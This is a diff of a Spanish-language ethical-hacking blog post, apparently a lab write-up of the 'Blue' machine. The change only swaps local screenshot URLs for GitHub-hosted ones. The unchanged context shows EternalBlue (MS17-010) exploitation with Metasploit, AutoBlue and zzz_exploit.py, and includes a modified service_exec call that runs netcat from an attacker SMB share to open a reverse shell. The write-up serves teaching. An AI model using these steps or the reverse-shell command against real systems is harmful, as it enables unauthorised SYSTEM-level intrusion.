@@ -100,7 +100,7 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 &lt;IP del host&gt;
 </code></pre></div></div>
 
-<p><img src="http://192.168.92.128:80/2.png" alt="2" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/2.png" alt="2" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">128</code>, por lo que podemos intuir que estamos ante una máquina <em>Windows</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>
 
@@ -334,14 +334,14 @@ set RHOST &lt;IP del host&gt;
 exploit
 </code></pre></div></div>
 
-<p><img src="http://192.168.92.128:80/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>La ejecución del módulo nos devuelve una sesión <code class="language-plaintext highlighter-rouge">Meterpreter</code> desde la cual podemos interactuar con el sistema comprometido. Desde esta sesión es posible invocar una shell interactiva.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
 </code></pre></div></div>
 
-<p><img src="http://192.168.92.128:80/12.png" alt="12" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/12.png" alt="12" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Al verificar el contexto de ejecución, observamos que el proceso se ejecuta como <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>, es decir, con los máximos privilegios del sistema. Por tanto, no es necesario realizar ninguna escalada de privilegios adicional.</p>
 
@@ -374,7 +374,7 @@ exploit
 
 <p>Una vez confirmada la escucha y continuada la ejecución, el exploit se ejecutará y obtendremos una shell interactiva dentro de la máquina víctima.</p>
 
-<p><img src="http://192.168.92.128:80/13.png" alt="13" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/13.png" alt="13" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h5 id="autoblue"><a href="#header-5"></a>AutoBlue</h5>
 
@@ -392,7 +392,7 @@ exploit
 
 <p>Desde el menú interactivo seleccionaremos la opción para generar el <code class="language-plaintext highlighter-rouge">shellcode</code> con <code class="language-plaintext highlighter-rouge">MSFvenom</code>. Indicaremos nuestra dirección IP y, dado que el script no detecta automáticamente la arquitectura del sistema objetivo, nos solicitará el puerto en el que nos pondremos en escucha tanto para <em>64 bits</em> como para 32 bits. Asimismo, seleccionaremos la opción para generar una shell interactiva en lugar de una sesión <em>Meterpreter</em> y especificaremos que el payload sea de tipo <em>stageless</em>.</p>
 
-<p><img src="http://192.168.92.128:80/14.png" alt="14" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/14.png" alt="14" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez generado el <em>shellcode</em>, regresamos al directorio principal. Antes de ejecutar el exploit, debemos ponernos en escucha en el puerto previamente configurado, desde una nueva terminal:</p>
 
@@ -406,7 +406,7 @@ exploit
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python eternalblue_exploit7.py &lt;IP del host&gt; shellcode/sc_x64.bin
 </code></pre></div></div>
 
-<p><img src="http://192.168.92.128:80/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h5 id="ms17-010"><a href="#header-5"></a>MS17-010</h5>
 
@@ -426,19 +426,19 @@ exploit
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 checker.py
 </code></pre></div></div>
 
-<p><img src="http://192.168.92.128:80/16.png" alt="16" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/16.png" alt="16" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Aunque las <em>null sessions</em> están habilitadas, será necesario editar el script para especificar un usuario válido, por ejemplo <code class="language-plaintext highlighter-rouge">guest</code>. No será necesario indicar contraseña. Una vez realizado este ajuste, ejecutaremos nuevamente el script y se nos mostrarán los <code class="language-plaintext highlighter-rouge">named pipes</code> disponibles que podremos utilizar durante la explotación.</p>
 
-<p><img src="http://192.168.92.128:80/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p><img src="http://192.168.92.128:80/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Por defecto, el script <code class="language-plaintext highlighter-rouge">zzz_exploit.py</code> crea un archivo pwned.txt en la máquina víctima, lo cual no nos resulta especialmente útil. Lo que haremos ahora será modificar este script, concretamente la función <code class="language-plaintext highlighter-rouge">smb_pwn()</code>.</p>
 
 <p>En primer lugar, especificaremos un usuario válido, de forma similar a como hicimos previamente con <code class="language-plaintext highlighter-rouge">checker.py</code>.</p>
 
-<p><img src="http://192.168.92.128:80/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>A continuación, comentaremos las líneas relacionadas con la creación del archivo y habilitaremos la llamada a <code class="language-plaintext highlighter-rouge">service_exec()</code>, adaptándola a nuestras necesidades.</p>
 
@@ -449,7 +449,7 @@ exploit
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">service_exec</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="sa">r</span><span class="sh">'</span><span class="s">cmd /c \\&lt;IP local&gt;\smbFolder\nc64.exe -e cmd &lt;IP local&gt; 443</span><span class="sh">'</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p><img src="http://192.168.92.128:80/20.png" alt="20" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/20.png" alt="20" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez modificado el script, el siguiente paso será descargar el binario de <a href="https://eternallybored.org/misc/netcat/">Netcat</a> que vamos a compartir.</p>
 
@@ -470,7 +470,7 @@ exploit
 
 <p>De esta forma, obtendremos una shell interactiva dentro de la máquina víctima con privilegios máximos, ejecutándose como <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code>.</p>
 
-<p><img src="http://192.168.92.128:80/21.png" alt="21" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2026-02-20-Blue-Practical-Ethical-Hacking/21.png" alt="21" class="blog-image" onclick="expandImage(this)" /></p>
 
   </article>
 
